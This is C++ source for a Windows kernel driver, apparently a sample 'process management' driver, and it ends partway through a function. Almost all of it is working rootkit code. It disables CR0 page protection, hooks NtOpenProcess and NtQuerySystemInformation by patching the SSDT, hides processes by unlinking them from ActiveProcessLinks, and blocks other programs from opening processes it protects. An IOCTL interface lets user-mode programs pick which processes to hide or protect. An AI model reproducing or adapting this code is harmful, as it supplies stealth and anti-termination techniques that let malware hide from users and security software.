//
//                       _oo0oo_
//                      o8888888o
//                      88" . "88
//                      (| -_- |)
//                      0\  =  /0
//                    ___/`---'\___
//                  .' \\|     |// '.
//                 / \\|||  :  |||// \
//                / _||||| -:- |||||- \
//               |   | \\\  -  /// |   |
//               | \_|  ''\---/''  |_/ |
//               \  .-\__  '-'  ___/-. /
//             ___'. .'  /--.--\  `. .'___
//          ."" '<  `.___\_<|>_/___.' >' "".
//         | | :  `- \`.;`\ _ /`;.`/ - ` : | |
//         \  \ `_.   \_ __\ /__ _/   .-` /  /
//     =====`-.____`.___ \_____/___.-`___.-'=====
//                       `=---='
//
//
//     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
//
//               佛祖保佑         永无BUG
//
//
//
/***************************************************************************************
* AUTHOR : EvilKnight
* DATE   : 2014-7-6
* MODULE : ProcessManageSys.C
* 
* Command: 
*	Source of IOCTRL Sample Driver
*
* Description:
*		Demonstrates communications between USER and KERNEL.
*
****************************************************************************************
* Copyright (C) 2014 EvilKnight.
****************************************************************************************/

//#######################################################################################
//# I N C L U D E S
//#######################################################################################

#ifndef CXX_PROCESSMANAGESYS_H
#include "ProcessManageSys.h"
#include "kernelUsermanage.h"
#endif

extern "C"
{
        extern PServiceDescriptorTable KeServiceDescriptorTable;
}

extern "C" PUCHAR PsGetProcessImageFileName(PEPROCESS EProcess); 

const ULONG uMaxProtectCount(16) ;


PDEVICE_EXTENSION g_pde = NULL ;


UCHAR g_ProtectProcess[uMaxProtectCount][16] = {0} ; // 要保护的进程名数组
ULONG g_uProtectProcessCount = 0 ;                                   // 计数器
ULONG g_ProtectProcessPID[uMaxProtectCount] = {0} ; // 要保护的进程pid数组
ULONG g_uProtectProcessPIDCount = 0 ;                              // 计数器

typedef NTSTATUS 
(* PNtOpenProcessPFU)(
                     OUT PHANDLE             ProcessHandle,
                     IN ACCESS_MASK          AccessMask,
                     IN POBJECT_ATTRIBUTES   ObjectAttributes,
                     IN PCLIENT_ID           ClientId 
                     ) ;

typedef  NTSTATUS
(* PNtQuerySystemInformationPFU)(
                          IN ULONG SystemInformationClass,
                          OUT PVOID SystemInformation,
                          IN ULONG SystemInformationLength,
                          OUT PULONG ReturnLength OPTIONAL
                          );

typedef NTSTATUS
(* PNtTerminateProcessPFU)(
                   IN HANDLE  ProcessHandle,
                   IN NTSTATUS  ExitStatus
                   );

PNtOpenProcessPFU                        g_pNtOpenProcess = NULL;
PNtQuerySystemInformationPFU      g_pNtQuerySystemInformation = NULL ;
PNtTerminateProcessPFU                 g_pNtTerminateProcess = NULL ;
//#include "struct.h"

//////////////////////////////////////////////////////////////////////////

//#######################################################################################
//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
//@@@@@@@@				D R I V E R   E N T R Y   P O I N T						 @@@@@@@@
//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
//#######################################################################################

/*******************************************************************************
*
*   函 数 名 : DriverEntry
*  功能描述 : D R I V E R   E N T R Y   P O I N T 
*  参数列表 : pDriverObj    --  
*                 pRegistryString
*   说      明 : 
*  返回结果 : 
*
*******************************************************************************/
NTSTATUS  DriverEntry(IN PDRIVER_OBJECT pDriverObj, 
                                        IN PUNICODE_STRING pRegistryString)
{
        NTSTATUS		status = STATUS_SUCCESS;
        UNICODE_STRING  ustrLinkName;
        UNICODE_STRING  ustrDevName;  
        PDEVICE_OBJECT  pDevObj;
        PDEVICE_EXTENSION pde = NULL ;
        int i = 0;

        dprintf("ProcessManageSys Driver\r\n"
            "Compiled %s %s\r\nIn DriverEntry : %wZ\r\n",
                        __DATE__, __TIME__, pRegistryString);

        // Register dispatch routines
/*
        for(i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++)
        {
                pDriverObj->MajorFunction[i] = DispatchCommon;  
        }
*/
        pDriverObj->MajorFunction[IRP_MJ_CREATE] = DispatchCreate;
        pDriverObj->MajorFunction[IRP_MJ_CLOSE] = DispatchClose;

        // Dispatch routine for communications
        pDriverObj->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchDeviceControl;

        // Unload routine
        pDriverObj->DriverUnload = DriverUnload;

        // Initialize the device name.
        RtlInitUnicodeString(&ustrDevName, NT_DEVICE_NAME);

        // Create the device object and device extension
        status = IoCreateDevice(pDriverObj, 
                                                sizeof(DEVICE_EXTENSION),
                                                &ustrDevName, 
                                                FILE_DEVICE_UNKNOWN,
                                                0,
                                                FALSE,
                                                &pDevObj);

        if(!NT_SUCCESS(status))
        {
                dprintf("Error, IoCreateDevice = 0x%x\r\n", status);
                return status;
        }

        //// Get a pointer to our device extension
        //deviceExtension = (PDEVICE_EXTENSION) deviceObject->DeviceExtension;
        pde = (PDEVICE_EXTENSION)(pDevObj->DeviceExtension) ;
        g_pde = pde ;

        //// Save a pointer to the device object
        //deviceExtension->DeviceObject = deviceObject;

        if(IoIsWdmVersionAvailable(1,0x10))
        {
                //如果是支持符号链接用户相关性的系统
                RtlInitUnicodeString(&ustrLinkName, SYMBOLIC_LINK_GLOBAL_NAME);
        }
        else
        {
                //不支持
                RtlInitUnicodeString(&ustrLinkName, SYMBOLIC_LINK_NAME);
        }
        
        // Create a symbolic link to allow USER applications to access it. 
        status = IoCreateSymbolicLink(&ustrLinkName, &ustrDevName);  
        
        if(!NT_SUCCESS(status))
        {
                dprintf("Error, IoCreateSymbolicLink = 0x%x\r\n", status);
                
                IoDeleteDevice(pDevObj); 
                return status;
        }	

        //
        //	TODO: Add initialization code here.
        //

        // 成功之后就开始初始化我们的设备扩展结构体了
        InitlizedDeviceExtension(pde) ;

        // 这里也可以用来监控
        //if(NT_SUCCESS(PsSetCreateProcessNotifyRoutine(CreateProcessNotifyRoutine, FALSE)))
        //{
        //        // 这里做标记
        //        pde->bIsSetCreateProcessNotifyRoutine = true ;
        //}

        // 挂钩NtOpenProcess
        if(HookNtOpenProcess(pDevObj))
        {
                pde->bIsHookNtOpenProcess = true ;
        }

        // 挂钩NtQuerySystemInformation
        if(HookNtQuerySystemInformation(pDevObj))
        {
                pde->bIsHookNtQuerySystemInformation = true ;
        }


        //// Tell the I/O Manger to do BUFFERED IO
        // 读写操作使用缓冲区方式访问用户模式数据
        // 一次只允许一个线程打开设备句柄
        pDevObj->Flags |= DO_BUFFERED_IO | DO_EXCLUSIVE ;

        // 移除初始标志
        pDevObj->Flags &= ~DO_DEVICE_INITIALIZING ;

        //// Save the DeviveObject
        InitializeKernelUserManage() ;
        Test() ;

        dprintf("DriverEntry Success\r\n");

        return STATUS_SUCCESS;
}

// 初始化Device_Extension中我们一些偏移的值
/*******************************************************************************
*
*   函 数 名 : InitlizedDeviceExtension
*  功能描述 : 初始化DeviceExtension中一些SSDT函数索引，系统结构体偏移值
*  参数列表 : pde    --  PDEVICE_EXTENSION 结构体
*   说      明 : 
*  返回结果 : 函数成功返回true,失败返回false
*
*******************************************************************************/
bool InitlizedDeviceExtension(PDEVICE_EXTENSION pde)
{
        RTL_OSVERSIONINFOW osi ={0} ;
        osi.dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOW) ;
        RtlGetVersion(&osi) ;

        if (NULL == pde)
        {
                return false ;
        }

        KeInitializeMutex(&pde->DeviceIoControlMutex, 0) ;
        KeInitializeMutex(&pde->MyThreadMutex, 0) ;

        // 判断系统版本，填充相应的值
        switch(osi.dwPlatformId)
        {
                case VER_PLATFORM_WIN32_NT:
                {
                        switch(osi.dwMajorVersion)
                        {
                        case 0:
                        case 1:
                        case 2:
                        case 3:
                        case 4:
                                // 这里的话是Windows NT系统
                                // 添加相应的代码
                                {
                                }
                                break ;
                        // 2k xp 2003
                        case 5:
                                {
                                        switch(osi.dwMinorVersion)
                                        {
                                        // 2000的系统
                                        case 0:
                                                {
                                                        pde->uNtQuerySystemInformationIndex = 151 ;
                                                        pde->uNtOpenProcessIndex = 106 ;
                                                }
                                                break ;
                                        // xp的系统
                                        case 1:
                                                {
                                                        pde->uNtQuerySystemInformationIndex = 173 ;
                                                        pde->uNtOpenProcessIndex = 122 ;
                                                        pde->uActiveProcessLinksOffset = 0x88 ;
                                                        pde->UniqueProcessIdOffset      = 0x84 ;
                                                }
                                                break ;
                                        // 2003的系统
                                        case 2:
                                                {
                                                        pde->uNtQuerySystemInformationIndex = 181 ;
                                                        pde->uNtOpenProcessIndex       = 128 ;
                                                        pde->uActiveProcessLinksOffset = 152 ;
                                                        pde->UniqueProcessIdOffset      = 148 ;
                                                }
                                                break ;
                                        }// end of switch(osi.dwMinorVersion)
                                } // end of case 5
                                break ;
                        // vista 2008 win 7
                        case 6:
                                {
                                        switch(osi.dwMinorVersion)
                                        {
                                         // vista 2008
                                        case 0:
                                                {
                                                        pde->uNtQuerySystemInformationIndex = 248 ; 
                                                        pde->uNtOpenProcessIndex = 194 ;
                                                }
                                                break ;
                                        // win 7     2008 r2
                                        case 1:
                                                {
                                                        pde->uNtQuerySystemInformationIndex = 260 ;
                                                        pde->uNtOpenProcessIndex = 189 ;
                                                        pde->uActiveProcessLinksOffset = 0xb8 ;
                                                        pde->UniqueProcessIdOffset      = 0xb4 ;
                                                }
                                                break ;
                                        }
                                }
                                break ;
                        default:
                                break ;
                        }
                }
                break ;

        }

        return true ;
}

/*******************************************************************************
*
*   函 数 名 : DriverUnload
*  功能描述 : DriverUnload
*  参数列表 : pDriverObj    --  
*   说      明 : 
*  返回结果 : 
*
*******************************************************************************/
VOID DriverUnload(IN PDRIVER_OBJECT pDriverObj)
{	
        UNICODE_STRING strLink;
        PDEVICE_EXTENSION pde = (PDEVICE_EXTENSION)pDriverObj->DeviceObject->DeviceExtension ;

        // Unloading - no resources to free so just return.
        dprintf("Unloading...\r\n");
        //
        // TODO: Add uninstall code here.
        //

        if (pde->bIsSetCreateProcessNotifyRoutine)
        {
                PsSetCreateProcessNotifyRoutine(CreateProcessNotifyRoutine, TRUE) ;
        }

        // 如果挂钩了NtOpenProcess
        if (pde->bIsHookNtOpenProcess)
        {
                UnHookNtOpenProcess(pDriverObj->DeviceObject) ;
        }

        // 如果挂钩了NtQuerySystemInformation
        if (pde->bIsHookNtQuerySystemInformation)
        {
                UnHookNtQuerySystemInformation(pDriverObj->DeviceObject) ;
        }
        
        // Delete the symbolic link
        if(IoIsWdmVersionAvailable(1,0x10))
        {
                //如果是支持符号链接用户相关性的系统
                RtlInitUnicodeString(&strLink, SYMBOLIC_LINK_GLOBAL_NAME);
        }
        else
        {
                //不支持
                RtlInitUnicodeString(&strLink, SYMBOLIC_LINK_NAME);
        }
        IoDeleteSymbolicLink(&strLink);

        // Delete the DeviceObject
        IoDeleteDevice(pDriverObj->DeviceObject);

        ReleaseKernelUserManage() ;

        dprintf("Unloaded Success\r\n");

        return;
}

/*******************************************************************************
*
*   函 数 名 : DispatchCreate
*  功能描述 : 
*  参数列表 : pDriverObj    --  
*                  pIrp
*   说      明 : 
*  返回结果 :  成功返回 STATUS_SUCCESS
*
*******************************************************************************/
NTSTATUS DispatchCreate(IN PDEVICE_OBJECT pDevObj, 
                                                IN PIRP pIrp)
{
        UNREFERENCED_PARAMETER(pDevObj) ;
        pIrp->IoStatus.Status = STATUS_SUCCESS;
        pIrp->IoStatus.Information = 0;

        IoCompleteRequest(pIrp, IO_NO_INCREMENT);

        return STATUS_SUCCESS;
}

/*******************************************************************************
*
*   函 数 名 : DispatchClose
*  功能描述 : 
*  参数列表 : pDriverObj    --  
*                  pIrp
*   说      明 : 
*  返回结果 :  成功返回 STATUS_SUCCESS
*
*******************************************************************************/
NTSTATUS DispatchClose(IN PDEVICE_OBJECT pDevObj, 
                                        IN PIRP pIrp)
{
        PDEVICE_EXTENSION pde = (PDEVICE_EXTENSION)pDevObj->DeviceExtension ;
        pIrp->IoStatus.Status = STATUS_SUCCESS;
        pIrp->IoStatus.Information = 0;

        IoCompleteRequest(pIrp, IO_NO_INCREMENT);

        // Return success
        return STATUS_SUCCESS;
}

/*******************************************************************************
*
*   函 数 名 : DispatchCommon
*  功能描述 : 
*  参数列表 : pDriverObj    --  
*                  pIrp
*   说      明 : 
*  返回结果 :  成功返回 STATUS_SUCCESS
*
*******************************************************************************/
NTSTATUS DispatchCommon(IN PDEVICE_OBJECT pDevObj, 
                                              IN PIRP pIrp)
{
        UNREFERENCED_PARAMETER(pDevObj) ;
        pIrp->IoStatus.Status = STATUS_SUCCESS;
        pIrp->IoStatus.Information = 0L;

        IoCompleteRequest( pIrp, 0 );

        // Return success
        return STATUS_SUCCESS;
}

/*******************************************************************************
*
*   函 数 名 : DispatchDeviceControl
*  功能描述 : 
*  参数列表 : pDriverObj    --  
*                  pIrp
*   说      明 : 
*  返回结果 :  成功返回 STATUS_SUCCESS
*
*******************************************************************************/
NTSTATUS DispatchDeviceControl(IN PDEVICE_OBJECT pDevObj, 
                                                     IN PIRP pIrp)
{
        NTSTATUS status               = STATUS_INVALID_DEVICE_REQUEST;	 // STATUS_UNSUCCESSFUL
        PIO_STACK_LOCATION pIrpStack  = IoGetCurrentIrpStackLocation(pIrp);
        ULONG uIoControlCode         = 0;
        PVOID pIoBuffer                     = NULL;
        ULONG uInSize                       = 0;
        ULONG uOutSize                    = 0;
        PHIDE_INFO pHi                      = NULL ;
        PPROTECT_PID_INFO pPi         = NULL ;
        PPROTECT_NAME_INFO  pNi  = NULL ;
        PDEVICE_EXTENSION pde = (PDEVICE_EXTENSION)pDevObj->DeviceExtension ;

        // Get the IoCtrl Code
        uIoControlCode = pIrpStack->Parameters.DeviceIoControl.IoControlCode;

        // Get the buffer info
        pIoBuffer = pIrp->AssociatedIrp.SystemBuffer;
        uInSize = pIrpStack->Parameters.DeviceIoControl.InputBufferLength;
        uOutSize = pIrpStack->Parameters.DeviceIoControl.OutputBufferLength;


        KdBreakPoint() ;
        KeWaitForSingleObject(&pde->DeviceIoControlMutex, 
                                                Executive,
                                                KernelMode,
                                                FALSE,
                                                NULL) ;

        switch(uIoControlCode)
        {
        // 添加要保护的进程名
        case IOCTRL_ADD_PROTECT_NAME:
                {
                        pNi = (PPROTECT_NAME_INFO)pIoBuffer ;
                        if (sizeof(PROTECT_NAME_INFO) != uInSize || NULL == pNi)
                        {
                                break ;
                        }
                        // 这里可以判断一下返回值
                        if(AddProtectProcessName(pNi->ProcessName))
                        {
                                status = STATUS_SUCCESS ;
                        }
                }
                break ;
        case IOCTRL_ADD_PROTECT_PID:
                {
                        pPi = (PPROTECT_PID_INFO)pIoBuffer ;
                        if (sizeof(PROTECT_PID_INFO) != uInSize || NULL == pPi)
                        {
                                break ;
                        }
                        // 这里可以判断一下返回值
                        if( AddProtectProcessPID(pPi->uPID))
                        {
                                status = STATUS_SUCCESS ;
                        }
                }
                break ;
                // 处理隐藏进程
                case IOCTRL_HIDE:
                        {
                                // Receive data form Application
                                //dprintf("IOCTRL_HIDE\r\n");

                                // Do we have any data?
                                // 判断传进来的参数是否正确
                                pHi = (PHIDE_INFO)pIoBuffer ;
                                if (sizeof(HIDE_INFO) != uInSize || NULL == pHi)
                                {
                                        break ;
                                }
                                // 这里可以判断一下返回值
                                if( HideProcess(pDevObj, pHi->uPID) )
                                {
                                        status = STATUS_SUCCESS ;
                                }
                        }
                        break ;
                case IOCTRL_START_FILTER:
                        {
                                if (! pde->bIsFiltrateProcess)
                                {
                                        pde->bIsFiltrateProcess = true ;
                                        status = STATUS_SUCCESS ;
                                }
                        }
                        break ;
                case IOCTRL_STOP_FILTER:
                        {
                                if (pde->bIsFiltrateProcess)
                                {
                                        pde->bIsFiltrateProcess = false ;
                                        status = STATUS_SUCCESS ;
                                }
                        }
                        break ;
                //
                // TODO: Add execute code here.
                //

                default:
                        {
                                // Invalid code sent
                                dprintf("Unknown IOCTL: 0x%X (%04X,%04X)\r\n", 
                                          uIoControlCode,
                                          DEVICE_TYPE_FROM_CTL_CODE(uIoControlCode),
                                          IoGetFunctionCodeFromCtlCode(uIoControlCode));
                                status = STATUS_INVALID_PARAMETER;	
                        }
                        break;
        }

        if(status == STATUS_SUCCESS)
        {
                pIrp->IoStatus.Information = uOutSize;
        }
        else
        {
                pIrp->IoStatus.Information = 0;
        }

        // Complete the I/O Request
        pIrp->IoStatus.Status = status;

        KeReleaseMutex(&pde->DeviceIoControlMutex, FALSE) ;
        IoCompleteRequest(pIrp, IO_NO_INCREMENT);
        
        return status;
}


/*******************************************************************************
*
*   函 数 名 : HideProcess
*  功能描述 : 隐藏进程 
*  参数列表 : pHi    --  隐藏进程参数结构体
*   说      明 : 通过ActiveProcessLinks断链来实现
*  返回结果 : 成功返回TRUE，失败返回FALSE
*
*******************************************************************************/
bool HideProcess(IN PDEVICE_OBJECT pDevObj, ULONG uPID)
{
        bool bResult = false ;
        PLIST_ENTRY  pCur ;
        PEPROCESS  pCurrentEprocess  = NULL; 
        KIRQL oldIrql ;
        PDEVICE_EXTENSION pde = NULL ;

        if (NULL == pDevObj)
        {
                return bResult ;
        }
        pde = (PDEVICE_EXTENSION)pDevObj->DeviceExtension ;
        if (NULL == pde)
        {
                return bResult ;
        }

        if(!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)uPID, &pCurrentEprocess)))
        {
                return bResult ;
        }
        
        oldIrql = KeRaiseIrqlToDpcLevel() ;

        // 如果找到的话，开始断链了
        pCur =(PLIST_ENTRY)((char *)pCurrentEprocess + pde->uActiveProcessLinksOffset ) ; // 取得当前的List
        
        // 检查一下是不是空链表的同时再检查一下上一个节点和下一个节点是不是都指向自己
        if(pCur->Blink != pCur
                && pCur->Flink != pCur
                && pCur->Blink->Flink == pCur
                && pCur->Flink->Blink == pCur)
        {
                // 下一个的BLink项指向当前上一个节点
                pCur->Flink->Blink = pCur->Blink ;
                // 上一个节点的指向下一个节点的项指向当前节点的下一个节点
                pCur->Blink->Flink = pCur->Flink ;
                // 总结上面二句就是往前后二个节点跳过自己

                // 再让自己指向自己吧
                pCur->Blink = pCur->Flink = pCur ;
                bResult = true ; 
        }

        KeLowerIrql(oldIrql) ;
        ObDereferenceObject((void *)pCurrentEprocess) ;
        return bResult ;

}

/*******************************************************************************
*
*   函 数 名 : PageProtectOFF
*  功能描述 : 去除页面保护 
*  参数列表 : 
*   说      明 : 
*  返回结果 : 无
*
*******************************************************************************/
void PageProtectOFF(void)
{
        __asm //去掉页面保护
        {
                push eax
                cli
                mov eax,cr0
                and eax,not 10000h //and eax,0FFFEFFFFh
                mov cr0,eax
                pop eax
        }
}

/*******************************************************************************
*
*   函 数 名 : PageProtectON
*  功能描述 : 开启页面保护 
*  参数列表 : 
*   说      明 : 
*  返回结果 : 无
*
*******************************************************************************/
void PageProtectON(void)
{
        __asm
        {
                push eax
                mov eax,cr0
                or eax,10000h //or eax,not 0FFFEFFFFh
                mov cr0,eax
                sti
                pop eax
        }
}

/*******************************************************************************
*
*   函 数 名 : MyMemCopy
*  功能描述 : 拷贝指定地址指定长度的数据到目标地址
 
*  参数列表 : 
*   说      明 : 
*  返回结果 : 无
*
*******************************************************************************/
bool MyMemCopy(PUCHAR pDstAddr, PUCHAR* pSrcAddr, ULONG uSrcSize)
{
        KIRQL  Irql;
        PAGED_CODE() ;
        if(NULL == pDstAddr
                || NULL == pSrcAddr)
        {
                return false ;
        }

        PageProtectOFF();

        //提升IRQL中断级
        Irql=KeRaiseIrqlToDpcLevel();

        if (pSrcAddr[0] != 0) //缓冲区不为空
        {
                memcpy((PVOID)pDstAddr, pSrcAddr, uSrcSize);
        }

        //恢复Irql
        KeLowerIrql(Irql);

        PageProtectON();
        return true ;
}

/*******************************************************************************
*
*   函 数 名 : CreateProcessNotifyRoutine
*  功能描述 : 判断创建的进程是否为拒绝运行程序，是的话结束
*  参数列表 : 
*   说      明 : 通过PID取得EPROCESS对象，再从里面取名字判断是否为拒绝运行的
*                   程序，是的话再通过PID打开进程，结束进程
*   返回结果 : 无
*
*******************************************************************************/
VOID CreateProcessNotifyRoutine (IN HANDLE  ParentId,
                                 IN HANDLE  ProcessId,
                                 IN BOOLEAN  Create )
{
        PEPROCESS pEProcess = NULL ;
        OBJECT_ATTRIBUTES ObjectAttributes;
        CLIENT_ID clientid;
        HANDLE handle ;
        return ;

        // 进程创建
        if (Create)
        {
                if (0 != ProcessId)
                {
                        if(NT_SUCCESS(PsLookupProcessByProcessId(ProcessId, &pEProcess)))
                        {
                                ObDereferenceObject(pEProcess) ;
                                // 这里可以再比一下进程名
                                InitializeObjectAttributes(&ObjectAttributes, 0 ,OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, 0, 0);
                                clientid.UniqueProcess = (HANDLE)ParentId;
                                clientid.UniqueThread=0;
                                if(NT_SUCCESS(ZwOpenProcess(&handle, PROCESS_ALL_ACCESS, &ObjectAttributes, &clientid)))
                                {
                                        ZwTerminateProcess(handle, 0) ;
                                }
                        }
                }
        }
        // 程序退出
        else
        {
        }
}

/*******************************************************************************
*
*   函 数 名 : DetoursNtOpenProcess
*  功能描述 : 代理NtOpenProcess函数
*  参数列表 : 
*   说      明 : 判断是否要打开我们要保护的进程，是的话直接返回权限错误
*  返回结果 : 
*
*******************************************************************************/
NTSTATUS  DetoursNtOpenProcess(
                               OUT PHANDLE             ProcessHandle,
                               IN ACCESS_MASK          AccessMask,
                               IN POBJECT_ATTRIBUTES   ObjectAttributes,
                               IN PCLIENT_ID           ClientId) 
{
        //dprintf("DetoursNtOpenProcess\r\n") ;
        //KdBreakPoint() ;
        if (NULL == g_pNtOpenProcess)
        {
                return STATUS_UNSUCCESSFUL ;
        }

        // 这里开始处理打开进程，判断是不是我们要保护的进程
        if (NULL != ClientId 
                && 0 != ClientId->UniqueProcess)
        {
                if(isProtectProcess(ClientId))
                {
                        return STATUS_ACCESS_DENIED ;
                }
        }

        return g_pNtOpenProcess(ProcessHandle,
								AccessMask,
								ObjectAttributes,
								ClientId) ; 
}

// SSDT Hook NtOpenProcess
/*******************************************************************************
*
*   函 数 名 : HookNtOpenProcess
*  功能描述 : Hook NtOpenProcess
*  参数列表 : pDevObj             --    DeviceObject对象
*   说      明 : 
*  返回结果 :  挂钩成功返回true, 失败返回false
*
*******************************************************************************/
bool HookNtOpenProcess(IN PDEVICE_OBJECT pDevObj) 
{
        KIRQL kIrql ;
        PDEVICE_EXTENSION pde = NULL ;
        PULONG pSSDT =  (PULONG)(KeServiceDescriptorTable->ServiceTableBase);

        if (NULL == pDevObj)
        {
                return false ;
        }

        pde = (PDEVICE_EXTENSION)pDevObj->DeviceExtension ;

        // Hook
        g_pNtOpenProcess = (PNtOpenProcessPFU) pSSDT[pde->uNtOpenProcessIndex];
        PageProtectOFF() ;
        kIrql = KeRaiseIrqlToDpcLevel() ;
        pSSDT[pde->uNtOpenProcessIndex] = (ULONG)DetoursNtOpenProcess;
        KeLowerIrql(kIrql) ;
        PageProtectON() ;
        return true ;
}

/*******************************************************************************
*
*   函 数 名 : UnHookNtOpenProcess
*  功能描述 : 卸载NtOpenProcess钩子
*  参数列表 : pDevObj        ---            设备对像
*   说      明 : 
*  返回结果 :  成功返回true,失败返回false
*
*******************************************************************************/
bool UnHookNtOpenProcess(IN PDEVICE_OBJECT pDevObj) 
{
        KIRQL kIrql ;
        PDEVICE_EXTENSION pde = NULL ;
        PULONG pSSDT =  (PULONG)(KeServiceDescriptorTable->ServiceTableBase);

        if (NULL == pDevObj)
        {
                return false ;
        }

        pde = (PDEVICE_EXTENSION)pDevObj->DeviceExtension ;

        if (! pde->bIsHookNtOpenProcess || NULL == g_pNtOpenProcess)
        {
                return false ;
        }

        // Hook
        PageProtectOFF() ;
        kIrql = KeRaiseIrqlToDpcLevel() ;
        // 将原来的值写进去
        pSSDT[pde->uNtOpenProcessIndex] = (ULONG)g_pNtOpenProcess;
        g_pNtOpenProcess = NULL ;
        KeLowerIrql(kIrql) ;
        PageProtectON() ;
        return true ;
}


/*******************************************************************************
*
*   函 数 名 : DetoursNtQuerySystemInformation
*  功能描述 : 代理NtQuerySystemInformation函数
*  参数列表 : 
*   说      明 : 
*  返回结果 :  
*
*******************************************************************************/
NTSTATUS DetoursNtQuerySystemInformation (
                                 IN ULONG SystemInformationClass,
                                 OUT PVOID SystemInformation,
                                 IN ULONG SystemInformationLength,
                                 OUT PULONG ReturnLength OPTIONAL
                                 )
{
        
        //dprintf("DetoursNtQuerySystemInformation\r\n") ;
        NTSTATUS ntStatus = STATUS_UNSUCCESSFUL ;

        // 看看函数指针是否为空
        if (NULL == g_pNtQuerySystemInformation)
        {
                return ntStatus ;
        }

        __try
        {

                // 先调用原来的函数
                ntStatus =  g_pNtQuerySystemInformation(SystemInformationClass,
                                                                                SystemInformation,
                                                                                SystemInformationLength,
                                                                                ReturnLength) ;
                if(! NT_SUCCESS(ntStatus))
                {
                        __leave ;
                }

                // 这里可以设一个开关
                //if (g_pde->bIsFiltrateProcess)
                //{
                //        __leave ;
                //}
                

                // 遍历进程的时候检查一下是否要过滤进程，是的话直接返回,不显示进程
                if(5 == SystemInformationClass
                        && SystemInformationLength > 200)
                {
                        // 然后开始处理了
                        PSYSTEM_PROCESS_INFORMATION spi = (PSYSTEM_PROCESS_INFORMATION)SystemInformation ;
                        if (0 == spi->NextEntryOffset)
                        {
                                __leave ;
                        }

                        PSYSTEM_PROCESS_INFORMATION fspi = (PSYSTEM_PROCESS_INFORMATION)( (DWORD)spi + spi->NextEntryOffset) ;
                        KdBreakPoint() ;

                        // 取得当前进程的uid
                        ULONG uCurrentUid = GetProcessUID((ULONG)PsGetCurrentProcessId()) ;
                        while ( spi->NextEntryOffset != 0 )
                        {
                                // 通过pid取得uid
                                ULONG uUid = GetProcessUID((ULONG)(fspi->UniqueProcessId)) ;
                                CLIENT_ID ClientId = {0} ;
                                ClientId.UniqueProcess = fspi->UniqueProcessId ;

                                // 如果不一样，清空一下指向下一个
                                if (uUid != uCurrentUid
                                        || isProtectProcess((PCLIENT_ID)&ClientId))
                                {
                                        fspi->UniqueProcessId = NULL;
                                        if (NULL != fspi->ImageName.Buffer)
                                        {
                                                RtlFillMemory(fspi->ImageName.Buffer, fspi->ImageName.Length, 0) ;
                                        }
                                        if (0 != fspi->NextEntryOffset)
                                        {
                                                spi->NextEntryOffset = (spi->NextEntryOffset + fspi->NextEntryOffset) ;
                                        }
                                        else
                                        {
                                                spi->NextEntryOffset = 0 ;
                                        }
                                }
                                // 判断是不是移除过
                                if(fspi != (PSYSTEM_PROCESS_INFORMATION)( (DWORD)spi + spi->NextEntryOffset))
                                {
                                        fspi = (PSYSTEM_PROCESS_INFORMATION)( (DWORD)spi + spi->NextEntryOffset) ;
                                }
                                else
                                {
                                        spi = fspi ;
                                        fspi = (PSYSTEM_PROCESS_INFORMATION)( (DWORD)fspi + fspi->NextEntryOffset) ;
                                }
                        }
                }       
        }

        __finally
        {
        }

        return ntStatus ;
}

// SSDT Hook NtQuerySystemInformation
/*******************************************************************************
*
*   函 数 名 : HookNtQuerySystemInformation
*  功能描述 : Hook NtQuerySystemInformation
*  参数列表 : pDevObj             --    DeviceObject对象
*   说      明 : 
*  返回结果 :  挂钩成功返回true, 失败返回false
*
*******************************************************************************/
bool HookNtQuerySystemInformation(IN PDEVICE_OBJECT pDevObj) 
{
        KIRQL kIrql ;
        PDEVICE_EXTENSION pde = NULL ;
        PULONG pSSDT =  (PULONG)(KeServiceDescriptorTable->ServiceTableBase);

        if (NULL == pDevObj)
        {
                return false ;
        }

        pde = (PDEVICE_EXTENSION)pDevObj->DeviceExtension ;

        // Hook
        g_pNtQuerySystemInformation  = (PNtQuerySystemInformationPFU) pSSDT[pde->uNtQuerySystemInformationIndex];
        PageProtectOFF() ;
        kIrql = KeRaiseIrqlToDpcLevel() ;
        pSSDT[pde->uNtQuerySystemInformationIndex] = (ULONG)DetoursNtQuerySystemInformation;
        KeLowerIrql(kIrql) ;
        PageProtectON() ;
        return true ;
}

// SSDT UnHook NtQuerySystemInformation
/*******************************************************************************
*
*   函 数 名 : UnHookNtQuerySystemInformation
*  功能描述 : UnHook NtQuerySystemInformation
*  参数列表 : pDevObj             --    DeviceObject对象
*   说      明 : 
*  返回结果 :  卸载钩子成功返回true, 失败返回false
*
*******************************************************************************/
bool UnHookNtQuerySystemInformation(IN PDEVICE_OBJECT pDevObj)
{
        KIRQL kIrql ;
        PDEVICE_EXTENSION pde = NULL ;
        PULONG pSSDT =  (PULONG)(KeServiceDescriptorTable->ServiceTableBase);

        if (NULL == pDevObj)
        {
                return false ;
        }

        pde = (PDEVICE_EXTENSION)pDevObj->DeviceExtension ;

        if (! pde->bIsHookNtQuerySystemInformation 
                || NULL == g_pNtQuerySystemInformation)
        {
                return false ;
        }

        // Hook
        PageProtectOFF() ;
        kIrql = KeRaiseIrqlToDpcLevel() ;
        // 将原来的值写进去
        pSSDT[pde->uNtQuerySystemInformationIndex] = (ULONG)g_pNtQuerySystemInformation;
        g_pNtQuerySystemInformation = NULL ;
        KeLowerIrql(kIrql) ;
        PageProtectON() ;
        return true ;
}

/*******************************************************************************
*
*   函 数 名 : isProtectProcess
*  功能描述 : 判断是否为保护进程
*  参数列表 : ClientId             --    进程ID
*   说      明 : 
*  返回结果 :  是需要保护的进程返回true,否则返回false
*
*******************************************************************************/
bool isProtectProcess(IN PCLIENT_ID           ClientId )
{
        bool bResult = false ;
        NTSTATUS ntStatus = STATUS_UNSUCCESSFUL ;
        PUCHAR pProcessName = NULL ;
        PEPROCESS pEprocess = NULL ;
        bool bIsFind = false ;

        if (NULL == ClientId)
        {
                return false ;
        }
        __try
        {
                // 先去查进程id是不是要保护的
                bIsFind = FindProtectProcessPID((ULONG)ClientId->UniqueProcess) ;
